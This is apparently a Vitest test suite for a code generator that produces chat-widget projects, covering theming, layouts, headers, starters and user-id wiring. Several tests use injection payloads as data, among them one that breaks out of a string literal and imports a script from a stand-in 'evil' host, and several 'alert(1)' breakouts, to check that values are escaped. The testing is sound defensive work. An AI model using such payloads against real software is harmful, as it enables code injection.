import { mkdtempSync, readFileSync, existsSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import ts from 'typescript';
import {
  accentContrastNotice,
  generateProject,
  mergeToolArgsIntoFormDefaults,
  resolveContrastForeground,
  writeProject,
} from './codegen';
import { validateConstruct, type Construct } from './schema';

function construct(overrides: Partial<Construct> = {}): Construct {
  const out = validateConstruct({
    name: 'acme-support',
    layout: 'widget',
    provider: { mode: 'mock' },
    ...overrides,
  });
  if (!out.ok) throw new Error(JSON.stringify(out.problems));
  return out.construct;
}

const file = (files: { path: string; code: string }[], path: string) => {
  const f = files.find((f) => f.path === path);
  if (!f) throw new Error(`missing ${path}; got ${files.map((x) => x.path).join(', ')}`);
  return f.code;
};

describe('generateProject (widget + mock core)', () => {
  it('emits the full project file set', () => {
    const paths = generateProject(construct()).map((f) => f.path).sort();
    expect(paths).toEqual(
      [
        'index.html',
        'package.json',
        'src/App.tsx',
        'src/element.tsx',
        'tsconfig.json',
        'vite.config.lib.ts',
        'vite.config.ts',
      ].sort(),
    );
  });

  it('is deterministic: same construct, same bytes', () => {
    expect(generateProject(construct())).toEqual(generateProject(construct()));
  });

  it('facade registers the construct name via @kitn.ai/ui/define', () => {
    const code = file(generateProject(construct()), 'src/element.tsx');
    expect(code).toContain("import { defineWebComponent } from '@kitn.ai/ui/define'");
    expect(code).toContain("defineWebComponent('acme-support'");
  });

  it('mock glue imports state + wire — never a hand-rolled SSE reader', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/state'");
    expect(app).toContain("from '@kitn.ai/ui/wire'");
    expect(app).not.toMatch(/text\/event-stream|EventSource|split\('\\n\\n'\)/);
  });

  it('theme accent lands on the HOST element as --kai-color-primary; mode maps onto the theme prop', () => {
    // Must be set on the host (via ctx.element in element.tsx), not anywhere
    // inside the shadow tree (App.tsx): the kit's --color-primary token is
    // resolved by a rule scoped to `:root, :host`, so --kai-color-primary set
    // on a descendant inside the shadow root never reaches it — custom
    // property inheritance only flows downward from where a property is
    // actually declared, and :host's own --color-primary is fixed at :host.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    expect(element).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
    // Not set anywhere inside App.tsx (the shadow-tree content) — that was
    // the bug: it looked wired but never reached the launcher or the bubble.
    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-primary');
  });

  it('a hostile accent cannot break out of the emitted string literal', () => {
    // The schema places no charset constraint on `accent` ("any CSS color"); a
    // value containing a single quote must not let attacker-controlled text
    // become live source in the emitted element.tsx (e.g. closing the literal
    // and injecting a new statement/import).
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const element = file(generateProject(construct({ theme: { accent: hostile, mode: 'system' } })), 'src/element.tsx');
    // The raw payload must never appear unescaped/unquoted in the source.
    expect(element).not.toContain(`setProperty('--kai-color-primary', '${hostile}')`);
    // It must appear only inside a properly JSON-escaped string literal — i.e.
    // the single quote in the payload is escaped, so it cannot terminate the
    // literal early.
    expect(element).toContain(`setProperty('--kai-color-primary', ${JSON.stringify(hostile)})`);
    // The raw text right after the call, unescaped, must never be followed by
    // an unescaped `'` — i.e. no bare `'red'` breakout.
    expect(element).not.toMatch(/setProperty\('--kai-color-primary', 'red'\)/);
  });

  it('theme.unreadColor lands on the HOST element as --kai-color-unread, same setProperty treatment as accent', () => {
    const files = generateProject(construct({ theme: { accent: '#e91e63', unreadColor: '#38BDF8', mode: 'dark' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-unread', \"#38BDF8\")");
    // Same host-not-shadow-tree rule as accent (see the test above): never
    // set inside App.tsx.
    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-unread');
  });

  it('theme.unreadColor with NO accent still emits a ctx-taking facade that sets --kai-color-unread (no contrast-pairing machinery required)', () => {
    const element = file(generateProject(construct({ theme: { unreadColor: '#38BDF8', mode: 'system' } })), 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-unread', \"#38BDF8\")");
    // No accent means no --kai-color-primary and no contrast-foreground CSS.
    expect(element).not.toContain('--kai-color-primary');
    expect(element).not.toContain('--kai-color-primary-foreground');
  });

  it('a hostile unreadColor cannot break out of the emitted string literal (same guard as accent)', () => {
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const element = file(generateProject(construct({ theme: { unreadColor: hostile, mode: 'system' } })), 'src/element.tsx');
    expect(element).not.toContain(`setProperty('--kai-color-unread', '${hostile}')`);
    expect(element).toContain(`setProperty('--kai-color-unread', ${JSON.stringify(hostile)})`);
    expect(element).not.toMatch(/setProperty\('--kai-color-unread', 'red'\)/);
  });

  it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
    const pkg = (spec?: string) =>
      JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
    expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
    expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
  });

  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
    // A named import with no reference anywhere else in the file fails TS6133
    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
    // Grepping for a bare, never-referenced `type { X }` import is a cheap
    // proxy for that without running tsc on the emitted string.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
  });

  it('emits no non-kit utility classes (interior styling rule)', () => {
    for (const f of generateProject(construct())) {
      expect(f.code).not.toMatch(/class(Name)?="(flex|grid|p-\d|m-\d|text-)/);
    }
  });

  it('composes the kit\'s MOST-INTEGRATED chat surface — ChatThread, the same composition <kai-chat> renders', () => {
    // T5 demo defect history: a hand-rolled <For>/<Message>/<MessageContent>
    // list had no padding, no gap, both roles left-aligned (round 3); Thread +
    // a hand-composed PromptInput/Button sat flush against the Dock panel and
    // clipped a focus ring (round 4 patched the symptom with inline padding).
    // Owner-ruled root cause: emitApp was re-deriving layout the kit already
    // owns. ChatThread (chat-thread.tsx) — the same composition
    // src/elements/chat.tsx renders behind <kai-chat> — owns the message
    // list AND the composer (padding, focus ring, send button) as one unit,
    // so there is nothing left here to restate.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/solid'");
    expect(app).toContain('<ChatThread messages={chat.messages()}');
    expect(app).toContain('onSubmit={submit}');
    // Every hand-composed primitive from earlier rounds must be GONE, not
    // supplemented: no bare Thread, no hand-rolled message loop, no manually
    // composed PromptInput/composer chrome.
    expect(app).not.toMatch(/<For each=\{chat\.messages\(\)\}/);
    expect(app).not.toContain('<MessageContent');
    expect(app).not.toContain('<Thread ');
    expect(app).not.toContain('<PromptInput');
    expect(app).not.toContain('<Button');
  });

  it('gates undeclared-capability affordances OFF: no-capability-vocabulary construct explicitly disables webSearch, voice and attach', () => {
    // Format rule: an undeclared capability's affordance must be OFF. The v1
    // construct schema carries no capability vocabulary at all yet (lands
    // Task 9), so every construct today is "no capabilities declared" — these
    // must be explicitly false, not just omitted, so the gating decision is
    // visible in the emitted source.
    //
    // `attach` was a real kit gap as of the previous round (ChatThread had no
    // passthrough to DefaultPromptInput's disabling prop) — closed upstream
    // (ChatThreadProps now forwards `attach`, mirroring webSearch/voice), so
    // this is a real functional assertion now, not a documented-gap stand-in.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('webSearch={false}');
    expect(app).toContain('voice={false}');
    expect(app).toContain('attach={false}');
    // No starter prompts, no model switcher: omitted entirely (undefined has
    // the same off-by-default effect as explicit false for these two).
    expect(app).not.toMatch(/\bsuggestions=\{/);
    expect(app).not.toMatch(/\bmodels=\{/);
  });

  it('ratchet: App.tsx carries (near) zero hand-authored inline styles now that ChatThread owns layout', () => {
    // Every prior round's fix for a layout defect (composer padding,
    // send-button alignment, the accent CSS var) was ANOTHER inline style —
    // treating the symptom, not the cause. This is the ratchet the owner
    // asked for: count `style={{` occurrences in the shadow-tree content
    // (App.tsx) and fail if it creeps back up. It's currently zero because
    // ChatThread + Dock need no per-instance layout styling from us at all;
    // if a future change needs one, it should be a deliberate, reviewed
    // increase to this bound, not a silent regression back to hand-styling.
    const app = file(generateProject(construct()), 'src/App.tsx');
    const inlineStyleCount = (app.match(/style=\{\{/g) ?? []).length;
    expect(inlineStyleCount).toBe(0);
  });

  it('index.html carries a demo host-page hint for the widget layout, outside the element', () => {
    // Owner feedback: a blank white page with one small launcher confused a
    // first-time viewer of the preview. The hint is a HOST-page nicety, not
    // part of the emitted widget — it must sit outside the custom element.
    const html = file(generateProject(construct()), 'index.html');
    expect(html).toMatch(/This blank page stands in for your site/);
    expect(html).toMatch(/bottom-right corner/);
    const hintIndex = html.indexOf('This blank page stands in for your site');
    const elementIndex = html.indexOf('<acme-support>');
    expect(hintIndex).toBeGreaterThan(-1);
    expect(elementIndex).toBeGreaterThan(-1);
    expect(hintIndex).toBeLessThan(elementIndex);
  });

  it('routes the theme accent onto the HOST only — App.tsx (message content) carries no accent/primary token at all', () => {
    // Owner ruling: "accent brands CONTROLS, never content." element.tsx sets
    // --kai-color-primary once, on the host; the launcher (dock.tsx's own
    // CSS) and the composer's send button (rendered inside ChatThread's
    // DefaultPromptInput, using the kit's own Button `variant="default"`)
    // pick it up for free via ordinary custom-property inheritance — no
    // per-control code needed in App.tsx at all.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    const app = file(files, 'src/App.tsx');
    // Exactly one hardcoded accent hex in the whole project: the
    // JSON.stringify'd custom-property value in element.tsx.
    const hexOccurrences = (element + app).match(/#e91e63/g) ?? [];
    expect(hexOccurrences).toHaveLength(1);
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    // App.tsx (the shadow-tree content ChatThread renders messages into)
    // authors NO styling at all any more — not a hex, not a CSS custom
    // property, not a Tailwind primary/accent utility class. If a future
    // regression routes the accent onto message content again, it will
    // necessarily show up as new text here, since today there is none.
    expect(app).not.toMatch(/#[0-9a-fA-F]{3,8}\b/);
    expect(app).not.toContain('--color-primary');
    expect(app).not.toContain('--kai-color-primary');
    expect(app).not.toMatch(/\btext-primary\b/);
    expect(app).not.toMatch(/\bbg-primary\b/);
    expect(app).not.toContain('[data-role="user"]');
    expect(app).not.toContain('[part="bubble content"]');
  });
});

describe('widget chrome (Task 19a)', () => {
  it('position threads onto Dock as a plain prop (closed enum, no escaping needed)', () => {
    const app = file(
      generateProject(construct({ widget: { position: 'top-start' } })),
      'src/App.tsx',
    );
    expect(app).toContain('<Dock label="acme-support" position="top-start">');
  });

  it('no widget field: Dock unchanged from before Task 19a', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
  });

  // Owner finding, 2026-08-26: a hand-rolled <img> left a permanently broken
  // icon in kai dev's own live FAB when its URL never resolved. DockLauncherImage
  // (ui/dock.tsx) is the graceful-degradation component — see src/ui/dock.test.tsx
  // for its own render-level fallback behavior; this only asserts the WIRE.
  it('launcherIcon renders a DockLauncherImage launcher override, JSON.stringify-escaped, and imports it', () => {
    const app = file(
      generateProject(construct({ widget: { launcherIcon: 'https://example.com/a.png' } })),
      'src/App.tsx',
    );
    expect(app).toContain('launcher={<DockLauncherImage src={"https://example.com/a.png"} />}');
    expect(app).toContain("import { ChatThread, createKaiChat, Dock, DockLauncherImage } from '@kitn.ai/ui/solid';");
  });

  it('no launcherIcon: DockLauncherImage is not imported at all, not even unused', () => {
    const app = file(generateProject(construct({ widget: { position: 'top-start' } })), 'src/App.tsx');
    expect(app).not.toContain('DockLauncherImage');
  });

  it('a hostile launcherIcon cannot break out of the emitted string literal', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ widget: { launcherIcon: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // The hostile payload's own embedded `"` must stay backslash-escaped
    // (JSON.stringify's doing), never appear as a raw, unescaped
    // string-closing quote immediately followed by `};alert(1)` — that raw
    // form is what a vulnerable `src="${launcherIcon}"` interpolation would
    // emit and is the actual breakout. A plain `.not.toContain('alert(1);//"')`
    // can't discriminate here: JSON.stringify's own closing delimiter always
    // sits right after `//` in the payload, safe or not, so that substring is
    // present either way — the backslash before the *embedded* quote is the
    // real signal.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('non-widget layouts never see widget props even if somehow present at the type level', () => {
    // schema already rejects this construct-side; codegen only needs to prove
    // the widget-only emit path is gated on c.layout === 'widget'.
    const app = file(generateProject(construct({ layout: 'fullscreen' })), 'src/App.tsx');
    expect(app).not.toContain('position=');
  });

  it('widget.defaultOpen true emits defaultOpen={true} on Dock', () => {
    const app = file(
      generateProject(construct({ widget: { defaultOpen: true } })),
      'src/App.tsx',
    );
    expect(app).toContain('<Dock label="acme-support" defaultOpen={true}>');
  });

  it('widget.defaultOpen false or absent: no defaultOpen prop at all (off-by-default gating)', () => {
    const appFalse = file(
      generateProject(construct({ widget: { defaultOpen: false } })),
      'src/App.tsx',
    );
    expect(appFalse).not.toContain('defaultOpen');
    const appAbsent = file(generateProject(construct()), 'src/App.tsx');
    expect(appAbsent).not.toContain('defaultOpen');
  });
});

describe('header (Task 19c)', () => {
  it('header.title threads into ChatThread\'s own chatTitle prop', () => {
    const app = file(
      generateProject(construct({ header: { title: 'Acme Support' } })),
      'src/App.tsx',
    );
    expect(app).toContain('chatTitle={"Acme Support"}');
  });

  it('no header declared: no chatTitle prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('chatTitle');
  });

  it('a hostile title cannot break out of the emitted string literal', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ header: { title: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // Same discriminator as the launcherIcon hostile-payload test above (Task
    // 19a): JSON.stringify's own closing delimiter always lands right after
    // `//` in this payload, safe or not, so a plain
    // `.not.toContain('alert(1);//"')` can't tell safe output from a real
    // breakout — it would fail against CORRECTLY escaped output too. The
    // real signal is whether the embedded quote right before `};alert(1)`
    // is backslash-escaped.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('custom layout: header.title is NOT wired (Thread has no chatTitle prop) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], header: { title: 'x' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('chatTitle');
  });
});

// owner feedback on the live widget: a mobile close X on its own dead row,
// separate from the title, "doesn't look intentional". The fix: a `widget`
// layout with a declared header.title gets its close control threaded into
// ChatThread's own header row (headerEndContent) instead of relying only on
// Dock's floating fallback X — zero collision by construction, no reserved
// dead-row band needed.
describe('widget close control shares the header row (owner feedback fix)', () => {
  it('widget + header.title: ChatThread gets headerEndContent, Dock gets hideClose + a controllerRef, App declares the closure', () => {
    const app = file(
      generateProject(construct({ layout: 'widget', header: { title: 'Acme Support' } })),
      'src/App.tsx',
    );
    expect(app).toContain('let dockClose: (() => void) | undefined;');
    expect(app).toContain(
      '<Dock label="acme-support" hideClose={true} controllerRef={(api) => (dockClose = () => api.setOpen(false))}>',
    );
    const chatThreadLine = app.split('\n').find((l) => l.includes('<ChatThread '));
    expect(chatThreadLine).toBeDefined();
    expect(chatThreadLine).toContain('headerEndContent={');
    expect(chatThreadLine).toContain('onClick={() => dockClose?.()}');
    expect(chatThreadLine).toContain('<DockCloseGlyph />');
    expect(app).toContain(', Button, DockCloseGlyph } from \'@kitn.ai/ui/solid\';');
  });

  it('widget with NO header.title: no headerEndContent, no hideClose, Dock unchanged — its own floating X stays the fallback (nothing renders in the header row for a close control to join)', () => {
    const app = file(generateProject(construct({ layout: 'widget' })), 'src/App.tsx');
    // The capability-gating doc comment above App() names "headerEndContent"/
    // "hideClose" in prose regardless (same discriminator as the empty/
    // reasoningOpen precedents above) — the real signal is actual code usage:
    // an import, a JSX attribute, or the closure declaration/reference.
    expect(app).not.toMatch(/\bheaderEndContent=\{/);
    expect(app).not.toMatch(/\bhideClose=\{/);
    expect(app).not.toMatch(/\bdockClose\s*[:=?]/);
    expect(app).toContain('<Dock label="acme-support">');
    expect(app).not.toContain('DockCloseGlyph');
  });

  it('non-widget layouts with a header.title: no Dock at all, so no close-control wiring even though a header exists', () => {
    const app = file(
      generateProject(construct({ layout: 'fullscreen', header: { title: 'Acme Support' } })),
      'src/App.tsx',
    );
    expect(app).not.toMatch(/\bheaderEndContent=\{/);
    expect(app).not.toMatch(/\bdockClose\s*[:=?]/);
    expect(app).not.toContain('<Dock');
  });
});

describe('empty (Task 14 — welcome-screen)', () => {
  it('threads the Empty composition straight onto ChatThread\'s emptyContent prop — no Portal, no App signature change', () => {
    const app = file(
      generateProject(construct({ empty: { title: 'Hi, welcome' } })),
      'src/App.tsx',
    );
    // emptyContent is a plain JSX prop: App composes ChatThread directly in the
    // SAME shadow tree defineWebComponent attaches, so there is no light-DOM
    // boundary to cross and no Portal needed at all (that indirection used to
    // leave the Empty composition's Tailwind classes unstyled — light-DOM
    // slotted content sits outside the shadow root's adopted stylesheet).
    expect(app).toContain('emptyContent={<Empty><EmptyHeader>');
    expect(app).toContain('<EmptyTitle>{"Hi, welcome"}</EmptyTitle>');
    expect(app).not.toContain('<Portal');
    expect(app).not.toContain("import { Portal }");
    expect(app).not.toMatch(/\bempty=\{true\}/);
    // App keeps its original zero-arg signature — nothing needs the host
    // element any more.
    expect(app).toContain('export function App() {');
    expect(app).toContain('Empty, EmptyHeader, EmptyTitle } from \'@kitn.ai/ui/solid\';');
  });

  it('description present: EmptyDescription is imported and emitted; absent: neither is', () => {
    const withDesc = file(
      generateProject(construct({ empty: { title: 'Hi', description: 'We can help.' } })),
      'src/App.tsx',
    );
    expect(withDesc).toContain('EmptyDescription');
    expect(withDesc).toContain('<EmptyDescription>{"We can help."}</EmptyDescription>');
    const noDesc = file(generateProject(construct({ empty: { title: 'Hi' } })), 'src/App.tsx');
    expect(noDesc).not.toContain('EmptyDescription');
  });

  it('icon present: EmptyMedia is imported and emitted as an <img>; absent: neither is', () => {
    const withIcon = file(
      generateProject(construct({ empty: { title: 'Hi', icon: 'https://example.com/icon.png' } })),
      'src/App.tsx',
    );
    expect(withIcon).toContain('EmptyMedia');
    expect(withIcon).toContain('<img src={"https://example.com/icon.png"}');
    const noIcon = file(generateProject(construct({ empty: { title: 'Hi' } })), 'src/App.tsx');
    expect(noIcon).not.toContain('EmptyMedia');
  });

  it('no empty declared: no emptyContent prop, no Empty-composition import, App() keeps its original zero-arg signature', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    // The capability-gating doc comment above App() names "empty"/"emptyContent"
    // in prose regardless (same discriminator as the reasoningOpen precedent
    // above: a plain `.not.toContain` would false-fail on that comment) — the
    // real signal is actual code usage: an import, a JSX tag, or a prop.
    expect(app).not.toMatch(/\bemptyContent=\{/);
    expect(app).not.toMatch(/<Empty /);
    expect(app).not.toMatch(/, Empty,/);
    expect(app).toContain('export function App() {');
  });

  // The whole point of the welcome screen: greeting AND starter chips both
  // render for an empty thread. ChatThread's own doc comment on `empty`
  // states the REPLACE slot only stands in for the empty MESSAGE LIST — the
  // composer and its suggestions still render below it — so wiring both
  // fields must never make one crowd out the other in the emitted source.
  it('empty + starters both declared: both the welcome greeting and the suggestions prop are wired, independently — chips survive', () => {
    const app = file(
      generateProject(
        construct({
          empty: { title: 'Hi, welcome', description: 'Ask us anything.' },
          capabilities: { starters: ["Where's my order?", 'Request a refund'] },
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('<EmptyTitle>{"Hi, welcome"}</EmptyTitle>');
    expect(app).toContain('suggestions={["Where\'s my order?","Request a refund"]}');
    // Both attributes land on the SAME <ChatThread ... /> tag — emptyContent
    // is not a substitute for the suggestions prop, and vice versa.
    const chatThreadLine = app.split('\n').find((l) => l.includes('<ChatThread '));
    expect(chatThreadLine).toBeDefined();
    expect(chatThreadLine).toContain('emptyContent={');
    expect(chatThreadLine).toContain('suggestions={');
  });

  it('a hostile title/description cannot break out of their emitted string literals', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ empty: { title: hostile, description: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // Same discriminator as the launcherIcon/header.title/userId precedent
    // (Tasks 19a/19c/19e): JSON.stringify's own closing delimiter always
    // lands right after `//` in this payload, safe or not, so a plain
    // `.not.toContain('alert(1);//"')` can't distinguish safe output from a
    // real breakout. The real signal is whether the embedded quote right
    // before `};alert(1)` is backslash-escaped.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('custom layout: empty is NOT wired (Thread has no empty slot) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], empty: { title: 'x' } })),
      'src/App.tsx',
    );
    expect(app).not.toMatch(/\bemptyContent=\{/);
  });
});

describe('userId (Task 19e)', () => {
  it('endpoint provider: threads x-kai-user-id header onto the chat fetch', () => {
    const app = file(
      generateProject(construct({
        provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
        userId: 'user_123',
      })),
      'src/App.tsx',
    );
    expect(app).toContain(`'x-kai-user-id': "user_123"`);
  });

  it('no userId: no header added, fetch calls unchanged from before this task', () => {
    const app = file(
      generateProject(construct({ provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('x-kai-user-id');
  });

  it('history local: userId folds into THREAD_KEY so different users don\'t share localStorage history', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } }, userId: 'user_123' })),
      'src/App.tsx',
    );
    expect(app).toContain('kai:acme-support:user_123:thread');
  });

  it('history local, no userId: THREAD_KEY unchanged from before this task', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('kai:acme-support:thread');
    expect(app).not.toContain('kai:acme-support:undefined:thread');
  });

  it('history endpoint: GET and PUT both carry the header', () => {
    const app = file(
      generateProject(construct({
        capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } },
        userId: 'user_123',
      })),
      'src/App.tsx',
    );
    const occurrences = app.split(`'x-kai-user-id': "user_123"`).length - 1;
    expect(occurrences).toBe(2); // GET + PUT
  });

  it('a hostile userId cannot break out of the emitted string literal at any of the three sites', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({
        provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
        capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } },
        userId: hostile,
      })),
      'src/App.tsx',
    );
    // A plain `.not.toContain('alert(1);//"')` is vacuous here (same class as
    // the Task 19a/19c precedent, launcherIcon/header.title): JSON.stringify's
    // own closing delimiter always lands right after `//` in this payload,
    // safe or not, so that substring is present either way. The real signal
    // is whether the embedded quote right before `};alert(1)` is
    // backslash-escaped (JSON.stringify's doing) rather than a raw,
    // string-closing quote — the actual breakout shape.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
    const stringified = JSON.stringify(hostile);
    expect(app.split(stringified).length - 1).toBeGreaterThanOrEqual(3); // provider POST + history GET + PUT
  });

  it('mock provider + no history: userId declared but inert — no crash, no emission anywhere', () => {
    const app = file(generateProject(construct({ userId: 'user_123' })), 'src/App.tsx');
    expect(app).not.toContain('x-kai-user-id');
  });
});

describe('layouts (Task 12)', () => {
  it.each([
    ['fullscreen', 'height: \'100dvh\''],
    ['aside', 'border-inline-start'],
    ['split', 'WorkspaceShell'],
  ] as const)('layout %s emits its chrome', (layout, marker) => {
    const app = file(generateProject(construct({ layout })), 'src/App.tsx');
    expect(app).toContain(marker);
    expect(app).not.toContain('<Dock');
  });

  it('widget stays unchanged: still wraps in Dock, no other layout chrome', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
    expect(app).not.toContain('WorkspaceShell');
  });

  it('split: real draggable splitter via WorkspaceShell, not a hand-rolled flex row', () => {
    const app = file(generateProject(construct({ layout: 'split' })), 'src/App.tsx');
    expect(app).toContain('<WorkspaceShell');
    expect(app).toContain('end={');
    expect(app).toContain('<slot name="pane" />');
    expect(app).not.toContain('PaneGroup');
  });

  it('index.html gates the widget-specific host hint to the widget layout only', () => {
    for (const layout of ['fullscreen', 'aside', 'split'] as const) {
      const html = file(generateProject(construct({ layout })), 'index.html');
      expect(html).not.toMatch(/bottom-right corner/);
    }
  });
});

describe('mobile takeover (Task 19d)', () => {
  it('aside: emits a scoped @media(max-width:480px) full-bleed override, mirroring Dock\'s own rule', () => {
    const app = file(generateProject(construct({ layout: 'aside' })), 'src/App.tsx');
    expect(app).toContain('data-kai-layout="aside"');
    expect(app).toMatch(/@media \(max-width: 480px\)/);
    expect(app).toContain('[data-kai-layout="aside"]');
  });

  it('split: wires WorkspaceShell\'s own drawerBelow prop instead of hand-rolled CSS', () => {
    const app = file(generateProject(construct({ layout: 'split' })), 'src/App.tsx');
    expect(app).toContain('drawerBelow={480}');
    // No second @media block for split — it delegates to the kit's own mobile mode.
    expect(app).not.toMatch(/@media \(max-width: 480px\)[^]*WorkspaceShell/);
  });

  it('fullscreen: unchanged — already full-bleed at every width, nothing emitted', () => {
    const app = file(generateProject(construct({ layout: 'fullscreen' })), 'src/App.tsx');
    expect(app).not.toMatch(/@media \(max-width: 480px\)/);
    expect(app).not.toContain('drawerBelow');
  });

  it('widget: untouched by this task (Dock already ships its own mobile mode)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
  });
});

describe('slots (Task 13)', () => {
  it('declared slots become named <slot> projection points', () => {
    const app = file(generateProject(construct({ slots: ['header'] })), 'src/App.tsx');
    expect(app).toContain('<slot name="header" />');
  });

  it('custom layout: minimal chrome, every slot present, spine intact', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header', 'footer'] })),
      'src/App.tsx',
    );
    expect(app).toContain('<slot name="header" />');
    expect(app).toContain('<slot name="footer" />');
    expect(app).toContain('<PromptInput'); // the spine is implied, never dropped
    expect(app).not.toContain('<Dock');
  });
});

describe('capabilities.starters', () => {
  it('starters thread into ChatThread\'s own suggestions prop, which already submits on click', () => {
    // ChatThread (chat-thread.tsx) already owns starter-prompt rendering AND
    // submission end to end: its `suggestions` prop renders the chips, hides
    // them once `messages` is non-empty, and (default suggestionMode
    // "submit") calls onSubmit with the clicked text. So there is nothing to
    // hand-compose here — the construct's starters thread straight into that
    // existing prop.
    const app = file(
      generateProject(construct({ capabilities: { starters: ['Track my order', 'Request a refund'] } })),
      'src/App.tsx',
    );
    expect(app).toContain('suggestions={["Track my order","Request a refund"]}');
    expect(app).toContain('<ChatThread messages={chat.messages()}');
    // No hand-rolled chip list — that would be restating layout ChatThread
    // already owns (the same lesson the ratchet test above pins).
    expect(app).not.toContain('<For each={chat.suggestions');
  });

  it('no starters, no suggestions prop at all (spine declares deviations only)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toMatch(/\bsuggestions=\{/);
  });

  it('a hostile starter cannot break out of the emitted array literal', () => {
    const hostile = "'}); alert(1); ({x:'";
    const app = file(
      generateProject(construct({ capabilities: { starters: [hostile] } })),
      'src/App.tsx',
    );
    expect(app).toContain(`suggestions={${JSON.stringify([hostile])}}`);
    expect(app).not.toContain(`suggestions={['${hostile}']}`);
  });
});

describe('capabilities.reasoning', () => {
  it('"compact" threads into ChatThread\'s own reasoning prop as a plain string', () => {
    const app = file(
      generateProject(construct({ capabilities: { reasoning: 'compact' } })),
      'src/App.tsx',
    );
    expect(app).toContain('reasoning="compact"');
    expect(app).toContain('<ChatThread messages={chat.messages()}');
  });

  it('"off" threads into the same prop', () => {
    const app = file(generateProject(construct({ capabilities: { reasoning: 'off' } })), 'src/App.tsx');
    expect(app).toContain('reasoning="off"');
  });

  it('explicit "full" emits no reasoning prop at all — same as omitting the field entirely', () => {
    const explicit = file(
      generateProject(construct({ capabilities: { reasoning: 'full' } })),
      'src/App.tsx',
    );
    const omitted = file(generateProject(construct()), 'src/App.tsx');
    expect(explicit).not.toMatch(/\breasoning=/);
    expect(omitted).not.toMatch(/\breasoning=/);
    expect(explicit).toEqual(omitted);
  });

  it('reasoningOpen true emits reasoningOpen={true} on ChatThread', () => {
    const app = file(
      generateProject(construct({ capabilities: { reasoningOpen: true } })),
      'src/App.tsx',
    );
    expect(app).toContain('reasoningOpen={true}');
  });

  it('reasoningOpen false/absent: no prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('reasoningOpen');
  });

  it('custom layout: reasoningOpen is NOT wired (Thread has no reasoningOpen prop) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { reasoningOpen: true } })),
      'src/App.tsx',
    );
    // The exclusion-disclosure comment (CU-1, below) names "reasoningOpen" in
    // prose, so a plain `.not.toContain` would false-fail on that comment —
    // assert no PROP usage (`reasoningOpen=`) instead.
    expect(app).not.toMatch(/\breasoningOpen=/);
  });
});

